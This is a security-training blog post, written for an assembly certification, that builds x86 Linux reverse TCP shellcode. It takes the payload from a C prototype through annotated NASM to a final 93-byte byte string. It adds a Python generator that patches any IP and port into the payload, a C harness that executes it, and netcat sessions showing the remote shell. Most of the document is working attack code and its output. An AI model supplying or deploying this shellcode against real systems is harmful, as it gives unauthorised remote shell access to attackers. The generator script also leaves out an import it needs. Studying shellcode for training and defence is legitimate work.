---
layout: single
title: Creating a Reverse TCP Shellcode
date: 2018-09-05
categories:
  - security
  - shellcoding
tags:
  - securitytube
  - slae
---
Reverse TCP shells are similar to bind shells, in that they allow shell access over a network. The key difference is that a bind shell will listen on the remote host, but a remote shell instead instructs the remote host to connect back to another.

Using a reverse shell is of particular use if a target has a firewall that blocks incoming connections, but does not block outgoing connections.

In C, a reverse shell that connects back to `127.0.0.1` on port `4444` would look like this:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main ()
{
    const char* ip = "127.0.0.1";
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_aton(ip, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);

    return 0;
}
```

Analysis of the C Prototype
---------------------------
The key differences between this example and the bind shell [Discussed Here](/2018-09-04-creating-a-bind-shell-tcp-shellcode) are:

 * The `sin_addr` property of the `sockaddr_in` is set to an IP address that is parsed using `inet_aton`
 * `connect` is used, rather than `bind` and `accept`
 * The file descriptor used with `dup2` is the socket file descriptor

When creating the `sockaddr_in` struct, `inet_aton` is used to simplify creating the 32 bit representation of the IP address, rather than determining the values of each individual octet.

The usage of `connect` is self explanatory and is equivalent to that of the previously used `bind`.

Other than these two points, a detailed explanation of how the rest of the prototype works can be found in the previous post on [Creating a Bind Shell TCP Shellcode](/2018-09-04-creating-a-bind-shell-tcp-shellcode).

Converting the Prototype to Shellcode
-------------------------------------
As in the bind shell example, the shellcode will start by setting the frame pointer and clearing the immediately required registers:

```nasm
; set the frame pointer
mov   ebp, esp

; clear required registers
xor   eax, eax
xor   ecx, ecx
xor   edx, edx
```

Next, the `sockaddr_in` struct is created and pushed on to the stack.

At this point, there is a slight issue to overcome, that is that IP addresses can and frequently do contain zeros. As a result of this, it's necessary to XOR the value to ensure it does not contain any in the final shellcode.

In this case, as the IP address being used is `127.0.0.1`, the value `0xffffffff` is pushed into $eax, the XORd value of `127.0.0.1` is pushed into $ebx in reverse order (`0xfeffff80`) and then the value of $ebx is XORd with $eax and then pushed onto the stack:

```nasm
; create sockaddr_in struct
push  eax
push  eax             ; [$esp]: 8 bytes of padding
mov   eax, 0xffffffff
mov   ebx, 0xfeffff80
xor   ebx, eax
push  ebx             ; [$esp]: 127.0.0.1
push  word 0x5c11     ; [$esp]: 4444
push  word 0x02       ; [$esp]: AF_INET
```

Once the struct is on the stack, the socket can be created. As the file descriptor created by the call to `socket` will be needed in the $ebx register for both the `connect` and `dup2` calls that follow, it is moved directly there after the call is invoked:

```nasm
; call socket(domain, type, protocol)
xor   eax, eax
xor   ebx, ebx
mov   ax, 0x167       ; $eax: 0x167 / 359
mov   bl, 0x02        ; $ebx: AF_INET
mov   cl, 0x01        ; $ecx: SOCK_STREAM
int   0x80
mov   ebx, eax        ; $ebx: socket file descriptor
```

Finally, the connection can be made to the host, the file descriptors setup and the shell can be spawned. For more information on the latter two operations, refer to the previous post on [Creating a Bind Shell TCP Shellcode](/2018-09-04-creating-a-bind-shell-tcp-shellcode):

```nasm
; call connect(sockfd, sockaddr, socklen_t)
mov   ax, 0x16a
mov   ecx, esp
mov   edx, ebp
sub   edx, esp        ; $ecx: size of the sockaddr struct
int   0x80

; call dup2 to redirect STDIN, STDOUT and STDERR
xor   ecx, ecx
mov   cl, 0x3
dup:
xor   eax, eax
mov   al, 0x3f
dec   ecx
int   0x80
inc   ecx
loop  dup

; spawn /bin/sh using execve
; $ecx and $edx are 0 at this point
xor   eax, eax
xor   edx, edx
push  eax
push  0x68732f2f
push  0x6e69622f
mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
mov   al, 0x0b
int   0x80
```

The final shellcode looks like this:

```nasm
global _start

section .text
  _start:
    ; set the frame pointer
    mov   ebp, esp

    ; clear required registers
    xor   eax, eax
    xor   ecx, ecx
    xor   edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
    mov   eax, 0xffffffff
    mov   ebx, 0xfeffff80
    xor   ebx, eax
    push  ebx             ; [$esp]: 127.0.0.1
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
    xor   eax, eax
    xor   ebx, ebx
    mov   ax, 0x167       ; $eax: 0x167 / 359
    mov   bl, 0x02        ; $ebx: AF_INET
    mov   cl, 0x01        ; $ecx: SOCK_STREAM
    int   0x80
    mov   ebx, eax        ; $ebx: socket file descriptor

    ; call connect(sockfd, sockaddr, socklen_t)
    mov   ax, 0x16a
    mov   ecx, esp
    mov   edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
    xor   ecx, ecx
    mov   cl, 0x3
    dup:
    xor   eax, eax
    mov   al, 0x3f
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
    xor   eax, eax
    xor   edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
    mov   al, 0x0b
    int   0x80
```

Compiling & Testing
-------------------
To compile the program, run: `nasm -f elf32 reverse_tcp.asm && ld -m elf_i386 reverse_tcp.o -o reverse_tcp`

Once compiled, start a netcat listener on port `4444` by running `nc -vlp 4444` and then run the `reverse_tcp` executable. If successful, a connection should be made to the netcat listener with a shell that can execute commands as can be seen below:

```shell_session
$ nc -vlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from localhost 33048 received!
pwd
/home/rastating/Code/slae/assignment_2
netstat -an | grep "4444"
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN     
tcp        0     26 127.0.0.1:4444          127.0.0.1:33048         ESTABLISHED
tcp        0      0 127.0.0.1:33048         127.0.0.1:4444          ESTABLISHED
unix  3      [ ]         STREAM     CONNECTED     44442    
unix  3      [ ]         STREAM     CONNECTED     44441    
unix  3      [ ]         STREAM     CONNECTED     44440    
```

Modifying The Shellcode
-----------------------
Configuring the shellcode to use a different IP address and port is simple. As with the previous bind shell example, to change the port, one must simply change the `\x11\x5c` bytes to represent the desired port.

To change the IP address, each octet needs to be converted to hex and XORd. This also means that the value used to XOR the address also needs to be placed into the shellcode. In the static sample, the XOR bytes can be found by looking for `\xb8\xff\xff\xff\xff` and the encoded bytes can be found by looking for `\x80\xff\xff\xfe`.

When choosing a XOR byte to fill $eax with, it is important to remember that the same byte cannot appear in any of the octets, or it will result in a null byte being used.

To automate this process, Python can be used to determine a valid XOR byte and replace the appropriate bytes in the shellcode.

An example of how to do this can be found below:

```python
import socket
import sys

code =  ""
code += "\\x89\\xe5\\x31\\xc0\\x31\\xc9\\x31\\xd2"
code += "\\x50\\x50\\xb8\\xff\\xff\\xff\\xff\\xbb"
code += "\\x80\\xff\\xff\\xfe\\x31\\xc3\\x53\\x66"
code += "\\x68\\x11\\x5c\\x66\\x6a\\x02\\x31\\xc0"
code += "\\x31\\xdb\\x66\\xb8\\x67\\x01\\xb3\\x02"
code += "\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x66\\xb8"
code += "\\x6a\\x01\\x89\\xe1\\x89\\xea\\x29\\xe2"
code += "\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0"
code += "\\xb0\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf6"
code += "\\x31\\xc0\\x31\\xd2\\x50\\x68\\x2f\\x2f"
code += "\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
code += "\\xe3\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) < 3:
    print 'Usage: python {name} [ip] [port]'.format(name = sys.argv[0])
    exit(1)

ip = socket.inet_aton(sys.argv[1])

# Find valid XOR byte
xor_byte = 0
for i in range(1, 256):
    matched_a_byte = False
    for octet in ip:
        if i == int(octet.encode('hex'), 16):
            matched_a_byte = True
            break

    if not matched_a_byte:
        xor_byte = i
        break

if xor_byte == 0:
    print 'Failed to find a valid XOR byte'
    exit(1)

# Inject the XOR bytes
code = code.replace("\\xb8\\xff\\xff\\xff\\xff", "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x = struct.pack('B', xor_byte).encode('hex')))

# Inject the IP address
ip_bytes = []
for i in range(0, 4):
    ip_bytes.append(struct.pack('B', int(ip[i].encode('hex'), 16) ^ xor_byte).encode('hex'))

code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\x{b1}\\x{b2}\\x{b3}\\x{b4}".format(
    b1 = ip_bytes[0],
    b2 = ip_bytes[1],
    b3 = ip_bytes[2],
    b4 = ip_bytes[3]
))

# Inject the port number
port = hex(socket.htons(int(sys.argv[2])))
code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
    b1 = port[4:6],
    b2 = port[2:4]
))

print code
```

Running this script with the arguments `10.2.0.1` and `65520` results in the following shellcode:

```shell_session
$ python create.py 10.2.0.1 65520
\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x03\x03\x03\x03\xbb\x09\x01\x03\x02\x31\xc3\x53\x66\x68\xff\xf0\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

As the values 0, 1 and 2 all appear in the IP address, `\x03` was used for the XOR byte. This shellcode can then be used in a small C program to test it, like below:

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    unsigned char code[] = "\x89\xe5\x31\xc0\x31\xc9\x31\xd2\x50\x50\xb8\x03\x03\x03\x03\xbb\x09\x01\x03\x02\x31\xc3\x53\x66\x68\xff\xf0\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
```

Assuming this code is placed in a file named `test_shellcode.c`, it can be compiled by running: `gcc -m32 -fno-stack-protector -z execstack test_shellcode.c -o test`.

To test the shellcode, create a netcat listener again, this time on port 65520 and run the `test` executable. It should show the length of the shellcode, which will be 93 bytes and result in a valid shell being sent to the netcat listener once again:

```shell_session
$ ./test
Shellcode length: 93
```

```shell_session
$ nc -vlp 65520
Listening on [0.0.0.0] (family 0, port 65520)
Connection from rastating-PC 40956 received!
pwd
/home/rastating/Code/slae/utilities
netstat -an | grep "65520"
tcp        0      0 0.0.0.0:65520           0.0.0.0:*               LISTEN     
tcp        0     27 10.2.0.1:65520          10.2.0.1:40956          ESTABLISHED
tcp        0      0 10.2.0.1:40956          10.2.0.1:65520          ESTABLISHED
```

References
----------
* [https://en.wikipedia.org/wiki/Berkeley_sockets](https://en.wikipedia.org/wiki/Berkeley_sockets)
* [https://linux.die.net/man/7/ip](https://linux.die.net/man/7/ip)
* [https://linux.die.net/man/2/socket](https://linux.die.net/man/2/socket)
* [https://linux.die.net/man/2/connect](https://linux.die.net/man/2/connect)
* [https://linux.die.net/man/3/htons](https://linux.die.net/man/3/htons)

<hr />

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

Student ID: SLAE-1340

All source files can be found on GitHub at [https://github.com/rastating/slae](https://github.com/rastating/slae)
